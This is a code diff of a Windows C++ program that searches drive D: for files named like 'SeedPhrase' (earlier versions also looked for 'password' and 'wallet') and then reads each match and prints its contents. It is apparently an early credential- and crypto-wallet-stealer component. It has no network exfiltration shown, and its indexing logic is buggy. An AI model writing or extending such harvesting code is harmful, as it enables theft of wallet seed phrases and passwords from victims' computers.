@@ -7,7 +7,7 @@
 #include <vector>
 
 
-bool RecursiveSearchFiles(const std::wstring& currentDir, const std::wstring& partialName, std::wstring& foundedPaths){
+bool RecursiveSearchFiles(const std::wstring& currentDir, const std::wstring& partialName, std::vector<std::wstring>& foundedPaths){
         std::wstring searchPath = currentDir + L"\\*";
 
         WIN32_FIND_DATAW FindData{};
@@ -22,7 +22,7 @@ bool RecursiveSearchFiles(const std::wstring& currentDir, const std::wstring& pa
             if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)){
                 std::wstring filename = FindData.cFileName;
                 if (filename.find(partialName) != std::wstring::npos){
-                    foundedPaths = currentDir + L"\\" + filename;
+                    foundedPaths.push_back(currentDir + L"\\" + filename);
                     FindClose(hFind);
                     return true;
                 }
@@ -59,26 +59,70 @@ bool RecursiveSearchFiles(const std::wstring& currentDir, const std::wstring& pa
         return false;
     }
 
+void ReadFiles(const wchar_t* filePath){
+    HANDLE hFile = CreateFileW(
+        filePath,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return;
+
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize)){
+        CloseHandle(hFile);
+        return;
+    }
+
+    std::vector<char> buffer(static_cast<size_t>(fileSize.QuadPart) + 1, 0);
+    DWORD bytesRead = 0;
+
+    BOOL success = ReadFile(
+        hFile,
+        buffer.data(),
+        static_cast<DWORD>(fileSize.QuadPart),
+        &bytesRead,
+        nullptr
+    );
+
+    if (!success){
+        CloseHandle(hFile);
+        return;
+    }
+
+    CloseHandle(hFile);
+    std::cout << "Read " << bytesRead << " bytes:\n" << buffer.data() << "\n";
+}
+
 int main() {
     std::vector<std::wstring> filePartialName = { 
         L"SeedPhrase",
-        L"password",
-        L"wallet",
+        //L"passwords"
     };
     std::wstring baseDir = L"D:";
-    std::wstring foundPath;
+    std::vector<std::wstring> foundPath;
     size_t fPT = filePartialName.size();
     
     for (int i = 0; i < fPT; i++){
         if (RecursiveSearchFiles(baseDir, filePartialName[i], foundPath)){
-            std::wcout << foundPath << std::endl; 
+            std::wcout << foundPath[i] << std::endl; 
         } else {
             std::wcout << "[-] The file containing the {" 
             << filePartialName[i] 
             << "} section was not found!" << std::endl;
         }
     }
-    
+
+    for (int i = 0; i < fPT; i++) {
+        const wchar_t* wcstr = foundPath[i].c_str();
+        ReadFiles(wcstr);
+    }    
+
     system("PAUSE");
     return 0;
 }
